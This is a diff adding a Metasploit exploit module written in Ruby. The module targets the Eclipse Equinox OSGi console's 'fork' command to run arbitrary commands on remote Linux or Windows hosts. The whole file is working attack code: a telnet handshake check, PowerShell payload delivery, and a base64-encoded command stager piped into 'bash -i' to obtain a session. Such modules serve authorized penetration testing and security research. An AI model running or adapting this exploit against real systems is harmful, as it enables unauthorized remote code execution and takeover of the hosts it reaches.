@@ -1,0 +1,118 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+require 'base64'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+
+  TELNET_IAC = Msf::Exploit::Remote::Telnet
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Eclipse Equinoxe OSGi Console Command Execution',
+      'Description'    => %q{
+        Exploit Eclipse Equinoxe OSGi (Open Service Gateway initiative) console
+        'fork' command to execute arbitrary commands on the remote system..
+      },
+      'Author'         =>
+        [
+          'Quentin Kaiser <kaiserquentin@gmail.com>'
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+       [
+         ['URL', 'https://www.eclipse.org/equinox/documents/quickstart-framework.php']
+       ],
+      'Platform' => %w{ linux win },
+      'Arch' => [ARCH_ARMLE, ARCH_AARCH64, ARCH_X86, ARCH_X64],
+      'Targets'=> [
+        [ 'Linux (Bash Payload)', { 'Platform' => 'linux' } ],
+        [ 'Windows (Powershell Payload)', { 'Platform' => 'win' } ]
+       ],
+      'CmdStagerFlavor' => [ 'bourne' ],
+      'DisclosureDate'  => 'Feb 13 2018',
+      'DefaultTarget'   => 0))
+    deregister_options('SRVHOST', 'SRVPORT', 'SSL', 'SSLCert', 'URIPATH')
+    register_options([
+      OptInt.new('TIME_WAIT', [ true, 'Time to wait for payload to be executed', 20])
+    ])
+  end
+
+  def check
+    connect
+    res = sock.get_once
+    if res == TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_ECHO+\
+        TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_SGA+\
+        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_NAWS+\
+        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_TTYPE
+      # terminal type 'xterm-256color' = \x78\x74\x65\x72\x6D\x2D\x32\x35\x36\x63\x6F\x6C\x6F\x72
+      sock.put(TELNET_IAC::IAC+TELNET_IAC::SB+TELNET_IAC::OPT_TTYPE+\
+        "\x00xterm-256color"+TELNET_IAC::IAC+TELNET_IAC::SE)
+      res = sock.get_once
+    end
+    disconnect
+    if res && res == "osgi> "
+      return Exploit::CheckCode::Vulnerable
+    end
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    begin
+      print_status("Accessing the OSGi console ...")
+
+      unless check == Exploit::CheckCode::Vulnerable
+        fail_with(Failure::NoTarget, "#{peer} - Failed to access the OSGi console")
+      end
+
+      if target['Platform'] == "win" then
+        exec_command("fork \"#{cmd_psh_payload(payload.encoded, payload_instance.arch.first, {encode_final_payload: true, remove_comspec: true})}\"")
+      else
+        execute_cmdstager({:flavor => :bourne})
+      end
+
+      print_status("#{rhost}:#{rport} - Waiting for session...")
+
+      (datastore['TIME_WAIT']).times do
+        Rex.sleep(1)
+        # Success! session is here!
+        break if session_created?
+      end
+    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout => e
+      fail_with(Failure::Unknown, "#{rhost}:#{rport} - #{e.message}")
+    ensure
+      disconnect
+    end
+  end
+
+  def exec_command(cmd)
+      connect
+      res = sock.get_once
+      if res == TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_ECHO+\
+        TELNET_IAC::IAC+TELNET_IAC::WILL+TELNET_IAC::OPT_SGA+\
+        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_NAWS+\
+        TELNET_IAC::IAC+TELNET_IAC::DO+TELNET_IAC::OPT_TTYPE
+        sock.put(TELNET_IAC::IAC+TELNET_IAC::SB+TELNET_IAC::OPT_TTYPE+\
+          "\x00xterm-256color"+TELNET_IAC::IAC+TELNET_IAC::SE)
+        res = sock.get_once
+      end
+      print_status("Exploiting...")
+      sock.put("#{cmd}\r\n")
+      res = sock.get
+      sock.put("disconnect\r\n")
+      res = sock.get
+      sock.put("y\r\n")
+  end
+
+  def execute_command(cmd, opts={})
+    cmd_b64 = Base64.encode64(cmd).gsub(/\s+/, "")
+    # Runtime.getRuntime().exec() workaround on Linux. Requires bash.
+    exec_command("fork \"bash -c {echo,#{cmd_b64}}|{base64,-d}|{bash,-i}\"")
+  end
+end
